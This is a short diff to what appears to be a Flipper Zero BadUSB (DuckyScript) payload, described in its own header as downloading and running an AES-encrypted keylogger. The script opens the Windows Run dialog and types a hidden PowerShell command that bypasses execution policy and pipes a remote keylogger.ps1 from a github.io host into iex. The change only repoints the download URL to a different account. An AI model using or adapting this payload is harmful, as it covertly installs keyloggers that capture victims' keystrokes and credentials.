@@ -5,5 +5,5 @@ REM Description: Downloads and runs AES-encrypted keylogger from host server
 
 GUI r
 DELAY 600
-STRING powershell -w h -NoP -NonI -Ep Bypass -c "irm https://tbjr.github.io/Flipper-payloads/host/keylogger.ps1 | iex"
+STRING powershell -w h -NoP -NonI -Ep Bypass -c "irm https://vexbold.github.io/Flipper-payloads/host/keylogger.ps1 | iex"
 ENTER
